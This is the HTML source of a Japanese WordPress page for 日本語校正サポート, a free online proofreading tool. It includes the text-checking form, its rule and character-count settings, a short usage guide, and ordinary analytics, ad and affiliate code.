<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" xml:lang="ja" lang="ja" xmlns:fb="http://www.facebook.com/2008/fbml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>日本語校正サポート</title>
<meta http-equiv="Content-Style-Type" content="text/css" />
<meta http-equiv="Content-Script-Type" content="text/javascript" />
<!--[if IE]><meta http-equiv="imagetoolbar" content="no" /><![endif]-->

<link rel="stylesheet" href="http://www.kiji-check.com/wp/wp-content/themes/keni62_wp/common.css" type="text/css" media="all" />
<link rel="stylesheet" href="http://www.kiji-check.com/wp/wp-content/themes/keni62_wp/layout.css" type="text/css" media="all" />
<link rel="stylesheet" href="http://www.kiji-check.com/wp/wp-content/themes/keni62_wp/design.css" type="text/css" media="all" />
<link rel="stylesheet" href="http://www.kiji-check.com/wp/wp-content/themes/keni62_wp/advanced.css" type="text/css" media="all" />
<link rel="stylesheet" href="http://www.kiji-check.com/wp/wp-content/themes/keni62_wp/print.css" type="text/css" media="print" />

<link rel="shortcut icon" type="image/x-icon" href="http://www.kiji-check.com/wp/wp-content/themes/keni62_wp/favicon.ico" />
<link rel="apple-touch-icon" href="http://www.kiji-check.com/wp/wp-content/themes/keni62_wp/images/home-icon.png" />
<link rel="alternate" type="application/atom+xml" title="日本語校正サポート Atom Feed" href="http://www.kiji-check.com/feed/atom/" />

<!-- All in One SEO Pack 2.4.4.1 by Michael Torbert of Semper Fi Web Design[326,342] -->
<meta name="description"  content="日本語校正サポートは、正しい日本語の文章を書くためにお手伝いするサイトです。 日本語の校正をするならプロ仕様のこのソフト 日本語のルールを確認してみましょう 美しい表現方法を正しい文法で書くことによって、読みやすい文章となります。 文章を執筆する上で、ありがちなのはタイプミス、そして誤字脱字。このような間違いが多々あるような文章は、内容は関わらず印象が悪くなってしまいます。 だからこそ、文章を書き終わった後は念入りにチェックをする必要があるのです。 【日本語校正サポート】は、日本語の文章校正をお手伝いするシステムです。 文字を入力する" />

<link rel="canonical" href="http://www.kiji-check.com/" />
			<script type="text/javascript" >
				window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
				ga('create', 'UA-24042516-9', 'auto');
				// Plugins
				
				ga('send', 'pageview');
			</script>
			<script async src="https://www.google-analytics.com/analytics.js"></script>
			<!-- /all in one seo pack -->
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="日本語校正サポート &raquo; フィード" href="http://www.kiji-check.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="日本語校正サポート &raquo; コメントフィード" href="http://www.kiji-check.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="日本語校正サポート &raquo; 日本語の文章校正をサポート のコメントのフィード" href="http://www.kiji-check.com/top/feed/" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.4\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.4\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/www.kiji-check.com\/wp\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.3"}};
			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55357,56692,8205,9792,65039],[55357,56692,8203,9792,65039]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel='stylesheet' id='yarppWidgetCss-css'  href='http://www.kiji-check.com/wp/wp-content/plugins/yet-another-related-posts-plugin/style/widget.css?ver=4.9.3' type='text/css' media='all' />
<link rel='stylesheet' id='contact-form-7-css'  href='http://www.kiji-check.com/wp/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=4.9.2' type='text/css' media='all' />
<link rel='stylesheet' id='toc-screen-css'  href='http://www.kiji-check.com/wp/wp-content/plugins/table-of-contents-plus/screen.min.css?ver=1509' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='http://www.kiji-check.com/wp/wp-content/plugins/wordpress-popular-posts/public/css/wpp.css?ver=4.0.13' type='text/css' media='all' />
<link rel='stylesheet' id='wpx-article-checker-css'  href='http://www.kiji-check.com/wp/wp-content/plugins/wpx-article-check/assets/css/wpx-article-checker.css?ver=1.0.0' type='text/css' media='all' />
<link rel='stylesheet' id='sccss_style-css'  href='http://www.kiji-check.com?sccss=1&#038;ver=4.9.3' type='text/css' media='all' />
<script type='text/javascript' src='http://www.kiji-check.com/wp/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script>
<script type='text/javascript' src='http://www.kiji-check.com/wp/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<link rel='https://api.w.org/' href='http://www.kiji-check.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.kiji-check.com/wp/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.kiji-check.com/wp/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 4.9.3" />
<link rel='shortlink' href='http://www.kiji-check.com/' />
<link rel="alternate" type="application/json+oembed" href="http://www.kiji-check.com/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.kiji-check.com%2F" />
<link rel="alternate" type="text/xml+oembed" href="http://www.kiji-check.com/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.kiji-check.com%2F&#038;format=xml" />

<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="website" />
<meta property="og:title" content="日本語校正サポート" />
<meta property="og:url" content="http://www.kiji-check.com/" />
<meta property="og:site_name" content="日本語校正サポート" />
<meta property="og:image" content="http://www.kiji-check.com/wp/wp-content/uploads/2015/01/support1.png" />
<meta property="og:image:width" content="850" />
<meta property="og:image:height" content="570" />
<meta property="og:locale" content="ja_JP" />
<meta name="twitter:text:title" content="日本語の文章校正をサポート" />
<meta name="twitter:image" content="http://www.kiji-check.com/wp/wp-content/uploads/2015/01/support1.png?w=640" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="詳しくは投稿をご覧ください。" />
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-24042516-9', 'auto');
  ga('send', 'pageview');

</script>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
  (adsbygoogle = window.adsbygoogle || []).push({
    google_ad_client: "ca-pub-6343541737110565",
    enable_page_level_ads: true
  });
</script>
</head>

<body class="home page-template-default page page-id-2 col1">

<div id="fb-root"></div>
<div id="container">


<!--▼ヘッダー-->
<div id="header">
<div id="header-in">

<div id="header-title">
<p class="header-logo"><a href="http://www.kiji-check.com"><img src="http://www.kiji-check.com/wp/wp-content/themes/keni62_wp/images/logo.gif" alt="日本語校正サポート" /></a></p>


<h1>日本語校正サポート</h1>
</div>

<div id="header-text">
<p></p>
</div>

</div>
</div>
<!--▲ヘッダー-->




<!--main-->
<div id="main">
<!--main-in-->
<div id="main-in">


<!--▽メイン＆サブ-->
<div id="main-and-sub">

<!--▽メインコンテンツ-->
<div id="main-contents">



<div class="post">
<p class="al-c">スポンサードリンク<br />
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- 日本語トップ -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-2547561880876807"
     data-ad-slot="1886826150"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></p>
<h2>日本語の文章校正をサポート</h2>


<div class="contents clearfix">

	<div class="article">
	<!--本文-->
	<p>日本語校正サポートは、正しい日本語の文章を書くためにお手伝いするサイトです。<br />


<div class="wpx-article-checker">
    <div class="wac-form-section">
        <div class="wac-form-section-header">
            <p class="wac-form-section-h1">文章を入力</p>
        </div>

        <div class="wac-form-section-body">
            <p class="wac-counter-message">最大1万字までとなります。 （現在 <span class="wac-counter" data-wac-counter>0</span> 文字入力しています。）</p>

            <div class="wac-form-container">
                <div class="wac-keys" data-wac-keys>
                </div>

                <form class="wac-form" action="" method="POST">
                    <div class="wac-textarea-container">
                        <textarea class="wac-textarea" name="wac_sentence" cols="103" rows="15" data-wac-sentence></textarea>

                        <div class="wac-textarea-footer">
                            <div class="wac-yahoo-credit">
                                <!-- Begin Yahoo! JAPAN Web Services Attribution Snippet -->
                                <a href="http://developer.yahoo.co.jp/about">
                                <img src="http://i.yimg.jp/images/yjdn/yjdn_attbtn1_125_17.gif" title="Webサービス by Yahoo! JAPAN" alt="Web Services by Yahoo! JAPAN" width="125" height="17" border="0" style="margin:15px 15px 15px 15px"></a>
                                <!-- End Yahoo! JAPAN Web Services Attribution Snippet -->
                            </div>

                            <label class="wac-show-config">
                                <input type="checkbox" name="wac_show_config"  data-wac-toggle-config />
                                設定をカスタマイズする
                            </label>
                        </div>
                    </div>

                    <div class="wac-config" data-wac-config>
                        <table class="wac-config-table">
                            <tr class="wac-rules-config-row wac-basic-rules-config-row">
                                <td>
                                    <label>
                                        <input type="checkbox" name="wac_rules[1]" value="1" checked='checked' checked='checked'>
                                        誤字・誤変換
                                    </label>
                                    <label>
                                        <input type="checkbox" name="wac_rules[2]" value="2" checked='checked' checked='checked'>
                                        言葉の誤用
                                    </label>
                                    <label>
                                        <input type="checkbox" name="wac_rules[3]" value="3" checked='checked' checked='checked'>
                                        禁忌・不快語
                                    </label>
                                    <label>
                                        <input type="checkbox" name="wac_rules[6]" value="6" checked='checked' checked='checked'>
                                        外国地名表記の間違い
                                    </label>
                                    <label>
                                        <input type="checkbox" name="wac_rules[7]" value="7" checked='checked' checked='checked'>
                                        固有名詞表記の間違い
                                    </label>
                                    <label>
                                        <input type="checkbox" name="wac_rules[8]" value="8" checked='checked' checked='checked'>
                                        人名表記の間違い
                                    </label>
                                    <label>
                                        <input type="checkbox" name="wac_rules[13]" value="13" checked='checked' checked='checked'>
                                        登録商標など不用意に使うべきでない用語
                                    </label>
                                    <label>
                                        <input type="checkbox" name="wac_rules[9]" value="9" checked='checked' checked='checked'>
                                        ら抜き言葉
                                    </label>
                                    <label>
                                        <input type="checkbox" name="wac_rules[5]" value="5" checked='checked' checked='checked'>
                                        環境依存文字（機種依存文字）
                                    </label>
                                </td>
                                <td>
                                    レベル1 - 「基本」
                                </td>
                            </tr>

                            <tr class="wac-rules-config-row wac-unusual-rules-config-row">
                                <td>
                                    <label>
                                        <input type="checkbox" name="wac_rules[10]" value="10" checked='checked' checked='checked'>
                                        仮名表記が望ましい当て字
                                    </label>
                                    <label>
                                        <input type="checkbox" name="wac_rules[11]" value="11" checked='checked' checked='checked'>
                                        常用漢字表外の漢字
                                    </label>
                                    <label>
                                        <input type="checkbox" name="wac_rules[17]" value="17" checked='checked' checked='checked'>
                                        略語
                                    </label>
                                    <label>
                                        <input type="checkbox" name="wac_rules[12]" value="12" checked='checked' checked='checked'>
                                        一般的にはより平易な表記が望ましい言葉
                                    </label>
                                </td>
                                <td>
                                    レベル2 - 「難読」
                                </td>
                            </tr>

                            <tr class="wac-rules-config-row wac-quality-rules-config-row">
                                <td>
                                    <label>
                                        <input type="checkbox" name="wac_rules[14]" value="14" checked='checked' checked='checked'>
                                        二重否定
                                    </label>
                                    <label>
                                        <input type="checkbox" name="wac_rules[15]" value="15" checked='checked' checked='checked'>
                                        助詞不足
                                    </label>
                                    <label>
                                        <input type="checkbox" name="wac_rules[16]" value="16" checked='checked' checked='checked'>
                                        冗長表現
                                    </label>
                                </td>
                                <td>
                                    レベル3 - 「品質」
                                </td>
                            </tr>

                            <tr class="wac-counter-config-row">
                                <td colspan="2">
                                    <p class="wac-counter-config-message">文字のカウント方法を下記から選択して入力して下さい。</p>

                                    <ul class="wac-counter-config-list">
                                        <li>
                                            <label>
                                                <input type="radio" name="wac_counter_type" value="3" checked="checked" data-wac-counter-type="3" />
                                                全角も半角も１文字を１つと数える。
                                            </label>
                                        </li>
                                        <li>
                                            <label>
                                                <input type="radio" name="wac_counter_type" value="1" data-wac-counter-type="1" />
                                                １文字につき全角は１として半角は0.5と数える。
                                            </label>
                                        </li>
                                        <li>
                                            <label>
                                                <input type="radio" name="wac_counter_type" value="2" data-wac-counter-type="2" />
                                                １文字につき全角は２として半角は１と数える。
                                            </label>
                                        </li>
                                    </ul>

                                    <p class="wac-filter-config-message">カウントから、除く文字があれば、選択して下さい。</p>

                                    <ul class="wac-filter-config-list">
                                        <li>
                                            <label>
                                                <input type="checkbox" name="wac_filter_1" value="1" data-wac-filter="1" />
                                                句読点を除く
                                            </label>
                                        </li>
                                        <li>
                                            <label>
                                                <input type="checkbox" name="wac_filter_2" value="1" data-wac-filter="2" />
                                                句読点と記号を除く
                                            </label>
                                        </li>
                                        <li>
                                            <label>
                                                <input type="checkbox" name="wac_filter_3" value="1" data-wac-filter="3" />
                                                改行を除く
                                            </label>
                                        </li>
                                        <li>
                                            <label>
                                                <input type="checkbox" name="wac_filter_4" value="1" data-wac-filter="4" />
                                                空白を除く
                                            </label>
                                        </li>
                                        <li>
                                            <label>
                                                <input type="checkbox" name="wac_filter_5" value="1" data-wac-filter="5" />
                                                タブを除く
                                            </label>
                                        </li>
                                    </ul>
                                </td>
                            </tr>
                        </table>
                    </div>

                    <div class="wac-button-container">
                        <input type="hidden" name="wac_flow" value="1" />
                        <input class="wac-button" type="submit" value="日本語チェック" />
                    </div>
                </form>
            </div>
        </div>
    </div>

    </div>
</p>
<p style="text-align: center;"><a href="http://click.linksynergy.com/fs-bin/click?id=sW/2gCEEh5A&amp;subid=&amp;offerid=118580.1&amp;type=10&amp;tmpid=1425&amp;RD_PARM1=https%253A%252F%252Fwww.justmyshop.com%252Fapp%252Fservlet%252Fitem%253Fitem_code%253D9013225" target="new">日本語の校正をするならプロ仕様のこのソフト</a><br />
<img src="http://ad.linksynergy.com/fs-bin/show?id=sW/2gCEEh5A&amp;bids=118580.1&amp;type=10" alt="icon" width="1" height="1" /></p>
<p><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><br />
<!-- 日本語linkレス --><br />
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-6343541737110565"
     data-ad-slot="5077938967"
     data-ad-format="link"></ins><br />
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></p>
<p class="al-c">スポンサードリンク<br />
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><br />
<!-- 日本語トップ --><br />
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-2547561880876807"
     data-ad-slot="1886826150"
     data-ad-format="auto"></ins><br />
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></p>
<h3>日本語のルールを確認してみましょう</h3>
<p>美しい表現方法を正しい文法で書くことによって、読みやすい文章となります。</p>
<p>文章を執筆する上で、ありがちなのはタイプミス、そして誤字脱字。このような間違いが多々あるような文章は、内容は関わらず印象が悪くなってしまいます。</p>
<p>だからこそ、文章を書き終わった後は念入りにチェックをする必要があるのです。</p>
<p>【日本語校正サポート】は、日本語の文章校正をお手伝いするシステムです。<br />
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><br />
<!-- 日本語linkレス --><br />
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-6343541737110565"
     data-ad-slot="5077938967"
     data-ad-format="link"></ins><br />
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></p>
<h3>使用方法</h3>
<p>日本語校正サポートの使い方をご説明します。</p>
<h4>設定をカスタマイズする</h4>
<p>まずは、メイン枠左下にある【設定をカスタマイズする】をクリックしてみましょう。<br />
誤字・誤変換や禁忌・不快語などの基本レベル、当て字・略語などの難読レベル、冗長表現・助詞不足などの品質におけるレベルなど、レベルに応じてチェック項目を設定することが可能です。</p>
<p><img class="alignnone wp-image-120" src="http://www.kiji-check.com/wp/wp-content/uploads/2015/01/support1.png" alt="" width="600" height="402" srcset="http://www.kiji-check.com/wp/wp-content/uploads/2015/01/support1.png 850w, http://www.kiji-check.com/wp/wp-content/uploads/2015/01/support1-300x201.png 300w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p>全角/半角における文字数のカウント方法も設定することができます。また、句読点や記号・改行・空白・タブなどをカウントから除く設定も可能です。<br />
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><br />
<!-- 日本語トップリンク --><br />
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-2547561880876807"
     data-ad-slot="9103326410"
     data-ad-format="link"></ins><br />
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></p>
<p><img class="alignnone wp-image-121" src="http://www.kiji-check.com/wp/wp-content/uploads/2015/01/support2.png" alt="" width="600" height="387" srcset="http://www.kiji-check.com/wp/wp-content/uploads/2015/01/support2.png 790w, http://www.kiji-check.com/wp/wp-content/uploads/2015/01/support2-300x194.png 300w" sizes="(max-width: 600px) 100vw, 600px" /><br />
<img class="alignnone wp-image-122" src="http://www.kiji-check.com/wp/wp-content/uploads/2015/01/support3.png" alt="" width="600" height="319" srcset="http://www.kiji-check.com/wp/wp-content/uploads/2015/01/support3.png 790w, http://www.kiji-check.com/wp/wp-content/uploads/2015/01/support3-300x159.png 300w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<h4>文字を入力する</h4>
<p>メイン枠内で文章を執筆してください。打ち込むごとに上部に位置するサブ枠では、ローマ字変換が表示されます。また、入力する度に文字数も表示されます。文字数を決められた記事を作成する際に便利かと思います。</p>
<p><img class="alignnone wp-image-123" src="http://www.kiji-check.com/wp/wp-content/uploads/2015/01/support4.png" alt="" width="600" height="150" srcset="http://www.kiji-check.com/wp/wp-content/uploads/2015/01/support4.png 800w, http://www.kiji-check.com/wp/wp-content/uploads/2015/01/support4-300x75.png 300w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p>※執筆が終わった記事を貼り付け、キーボードの《Enter》を押しても反映され、文字数が表示されます。</p>
<h4>日本語チェック開始</h4>
<p>文章入力が完了したら、メイン枠の下部にある【日本語チェック】をクリックしてください。</p>
<p><img class="alignnone wp-image-124" src="http://www.kiji-check.com/wp/wp-content/uploads/2015/01/support5.png" alt="" width="600" height="188" srcset="http://www.kiji-check.com/wp/wp-content/uploads/2015/01/support5.png 800w, http://www.kiji-check.com/wp/wp-content/uploads/2015/01/support5-300x94.png 300w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p>すると、設定に基づき文章のチェックを行います。</p>
<p><img class="alignnone wp-image-125" src="http://www.kiji-check.com/wp/wp-content/uploads/2015/01/support6.png" alt="" width="600" height="608" srcset="http://www.kiji-check.com/wp/wp-content/uploads/2015/01/support6.png 800w, http://www.kiji-check.com/wp/wp-content/uploads/2015/01/support6-296x300.png 296w, http://www.kiji-check.com/wp/wp-content/uploads/2015/01/support6-60x60.png 60w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p>修正すべき箇所は黄色のマーカーが付けられ、どのレベル区分・どのような指摘を受けたのかが表示されます。<br />
また、参考として言い換える表現も表示されているので、修正しやすいかと思います。</p>
	<!--/本文-->
	</div>

	<!--/article-->

	


</div>

</div>
<!--/post-->
<p class="al-c">スポンサードリンク<br />
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- 日本語トップ -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-2547561880876807"
     data-ad-slot="1886826150"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></p>

<ul class="sb m20-b">
<li class="sb-tweet"></li>
<li class="sb-hatebu"></li>
<li class="sb-gplus"></li>
<li class="sb-fb-like"></li>
</ul>

</div>
<!--△メインコンテンツ-->


<!--▽サブコンテンツ-->
	<div id="sub-contents" class="sub-column">
	<div class="sub-contents-btn">サブコンテンツ</div>
	<div id="sub-contents-in">
</div>
</div>
<!--△サブコンテンツ-->


</div>
<!--△メイン＆サブ-->


<!--▼サイドバー-->
<!--▲サイドバー-->




</div>
<!--/main-in-->

</div>
<!--/main-->


<!--▼フッター-->
<div id="footer">
<div id="footer-in">


<!--アドレスエリア-->
<div class="area01">
<h3>文章校正支援ツール</h3>
<div class="access">
<div class="area01-freebox">
<a href="http://click.linksynergy.com/fs-bin/click?id=sW/2gCEEh5A&subid=&offerid=118580.1&type=10&tmpid=1425&RD_PARM1=http%253A%252F%252Fwww.justsystems.com%252Fjp%252Fproducts%252Fjustright%252F" target="new">本格的な文章校正ソフトはこちら</a><br />
<img alt="icon" width="1" height="1" src="http://ad.linksynergy.com/fs-bin/show?id=sW/2gCEEh5A&bids=118580.1&type=10"><br />
<a href="http://click.linksynergy.com/fs-bin/click?id=sW/2gCEEh5A&subid=&offerid=118580.1&type=10&tmpid=1425&RD_PARM1=http%253A%252F%252Fwww.justsystems.com%252Fjp%252Fproducts%252Fjustright%252F" target="new"><img src="http://www.justsystems.com/jp/products/justright/images/feature1_ph001_pop.gif" alt="icon" width="280" height="201" border="0"></a><br />
<img alt="icon" width="1" height="1" src="http://ad.linksynergy.com/fs-bin/show?id=sW/2gCEEh5A&bids=118580.1&type=10"></div>
</div>
</div>
<!--/アドレスエリア-->


<!--フッターメニュー-->
<div class="area02">
<h3>メニュー</h3>
<div class="footer-menu">
<div class="menu-%e3%83%a1%e3%83%8b%e3%83%a5%e3%83%bc1-container"><ul id="menu-%e3%83%a1%e3%83%8b%e3%83%a5%e3%83%bc1" class="menu"><li id="menu-item-56" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-56"><a href="http://www.kiji-check.com/category/japanese/">日本語</a></li>
</ul></div><div class="menu-%e3%83%a1%e3%83%8b%e3%83%a5%e3%83%bc%ef%bc%92-container"><ul id="menu-%e3%83%a1%e3%83%8b%e3%83%a5%e3%83%bc%ef%bc%92" class="menu"><li id="menu-item-208" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home current-menu-item page_item page-item-2 current_page_item menu-item-208"><a href="http://www.kiji-check.com/">日本語の文章校正をサポート</a></li>
</ul></div></div>
</div>
<!--/フッターメニュー-->


</div>

</div>
<!--▲フッター-->


<!--▼トップメニュー-->
<div id="top">
<div id="top-in">

<ul id="top-menu">
<li><a href="http://www.kiji-check.com/sitemap/">サイトマップ</a></li>
</ul>

</div>
</div>
<!--▲トップメニュー-->


<!--コピーライト-->
<div class="copyright">
<p><small>Copyright (C) 2018 日本語校正サポート <span>All Rights Reserved.</span></small></p>
</div>
<!--/コピーライト-->


</div>
<!--▼ページの先頭へ戻る-->
<p class="page-top"><a href="#container">このページの先頭へ</a></p>
<!--▲ページの先頭へ戻る-->


<script type='text/javascript'>
/* <![CDATA[ */
var wpcf7 = {"apiSettings":{"root":"http:\/\/www.kiji-check.com\/wp-json\/contact-form-7\/v1","namespace":"contact-form-7\/v1"},"recaptcha":{"messages":{"empty":"\u3042\u306a\u305f\u304c\u30ed\u30dc\u30c3\u30c8\u3067\u306f\u306a\u3044\u3053\u3068\u3092\u8a3c\u660e\u3057\u3066\u304f\u3060\u3055\u3044\u3002"}}};
/* ]]> */
</script>
<script type='text/javascript' src='http://www.kiji-check.com/wp/wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=4.9.2'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var tocplus = {"smooth_scroll":"1","visibility_show":"\u8868\u793a","visibility_hide":"\u975e\u8868\u793a","width":"Auto"};
/* ]]> */
</script>
<script type='text/javascript' src='http://www.kiji-check.com/wp/wp-content/plugins/table-of-contents-plus/front.min.js?ver=1509'></script>
<script type='text/javascript' src='http://www.kiji-check.com/wp/wp-content/themes/keni62_wp/js/utility.js?ver=4.9.3'></script>
<script type='text/javascript' src='http://www.kiji-check.com/wp/wp-content/themes/keni62_wp/js/socialButton.js?ver=4.9.3'></script>
<script type='text/javascript' src='http://www.kiji-check.com/wp/wp-content/plugins/wpx-article-check/assets/js/wpx-article-checker.js?ver=1.0.0'></script>
<script type='text/javascript' src='http://www.kiji-check.com/wp/wp-includes/js/wp-embed.min.js?ver=4.9.3'></script>
<script src="http://frn.a.swcs.jp/13/j/" type="text/javascript"></script>
<script type="text/javascript" src="http://28fk.com/gap/?i=vd73"></script>


</body>
</html>